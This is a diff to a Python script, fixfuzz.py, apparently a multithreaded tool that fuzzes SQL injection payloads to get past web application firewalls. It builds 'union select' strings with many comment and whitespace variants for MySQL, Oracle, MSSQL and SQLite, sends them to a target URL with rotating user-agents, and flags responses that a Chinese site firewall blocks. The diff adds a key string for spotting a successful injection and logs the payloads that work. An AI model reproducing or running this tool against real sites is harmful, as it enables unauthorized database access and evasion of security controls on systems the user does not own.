@@ -10,17 +10,17 @@ import requests
 import getopt
 import random
 import threading
-import time
 
 tested = []
 num = 0
 
 class threadclass(threading.Thread):
-    def __init__(self,url,proxies,db):
+    def __init__(self,url,proxies,db,key):
         threading.Thread.__init__(self)
         self.url = url
         self.proxies = proxies
         self.db = db
+        self.key = key
         self.headers = [
             'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
             'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
@@ -45,7 +45,7 @@ class threadclass(threading.Thread):
         self.FUZZ_qwe = ['/*', '*/', '/*!', '/**/', '?', '/', '*', '=', '`', '!', '%', '.', '-', '+']
         self.FUZZ_ewq = [' ']
         self.FUZZ_sqllite = ['0A', '0D', '0C', '09', '20']
-        self.FUZZ_mysql = ['09', '0A', '0B', '0C', '0D', 'A0', '20']
+        self.FUZZ_mysql = ['09', '0A', '0B', '0C', '0D', 'A0', '20','aa']
         self.FUZZ_oracle = ['00', '09', '0A', '0B', '0C', '0D', '20']
         self.FUZZ_mssql = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0A', '0B', '0C', '0D', '0E', '0F', '10',
                       '11', '12', '13', '14', '15', '16', '17', '18', '19', '1A', '1B', '1C', '1D', '1E', '1F', '20',
@@ -66,21 +66,20 @@ class threadclass(threading.Thread):
                                 pass
                             else:
                                 tested.append(fix)
-                                payload = '/*!union'+fix+'select*/(@@version)'
+                                payload = ' union'+fix+'select'+fix+'1/*!*/'
                                 url_test = self.url+payload
                                 header = {'User-Agent': random.choice(self.headers)}
                                 try:
                                     res = requests.get(url=url_test,headers=header,timeout=5)
-                                    status = res.status_code
                                 except Exception:
                                     print(url_test+' requests failed')
                                     print(header)
-                                with open('results.txt','a+') as file:
+                                with open('payload.txt','a+') as file:
                                     if '网站防火墙' in res.text:
                                         print(url_test+'\033[0;31;40m is bad\033[0m')
-                                    elif status == '200' and 'MariaDB' in res.text:
+                                    elif self.key in res.text:
                                         print('[STATUS]'+url_test+'\033[0;32;40mIS OK!!!\033[0m')
-                                        file.write(url_test)
+                                        file.write(payload+'\n')
                                     else:
                                         print(url_test+' \033[0;33;40mnot a value select\033[0m')
                                 num += 1
@@ -92,17 +91,17 @@ def usage():
     print('./fixfuzz.py -u <url> -d <dbname> [-r <threads> -p -h]')
     print(' -u |--url <URL>')
     print(' -d |--dbms database kind<sqllite,mysql,oracle,mssql>')
-    print(' -d |--dbms database kind<sqllite,mysql,oracle,mssql>')
+    print(' -k |--key the correct response page have the key')
     print(' -r |--threads <Number of threads> Defaults to 16(max)')
     print(' -p |--proxy proxy(开发中)')
     print(' -h |--help Shows this help\n')
-    print('Eg. ./fixfuzz.py -u http://127.0.0.1/news/list.php?id=11 -d mysql -r 256 -p http://127.0.0.1:1080\n')
+    print('Eg. ./fixfuzz.py -u http://127.0.0.1/news/list.php?id=11 -d mysql -r 256 -k MYSQL\n')
 def main(argv):
     num = 1
     proxies = False
     threads = 16
     try:
-        opts, args = getopt.getopt(argv, 'hp:r:d:u:', ['help', 'proxy=', 'url=', 'threads=', 'dbms='])
+        opts, args = getopt.getopt(argv, 'hp:r:d:u:k:', ['help', 'proxy=', 'url=', 'threads=', 'dbms=','key='])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
@@ -114,6 +113,8 @@ def main(argv):
             url = u
         if i in ('-d','--dbms'):
             db = u
+        if i in ('-k','--key'):
+            key = u
         if i in ('-r','--threads'):
             threads = u
         if i in ('-p','--proxy'):
@@ -123,7 +124,7 @@ def main(argv):
         sys.exit(-1)
     threadlist = []
     for i in range(int(threads)):
-        t = threadclass(url,proxies,db)
+        t = threadclass(url,proxies,db,key)
         threadlist.append(t)
         t.start()
     while len(threadlist) > 0:
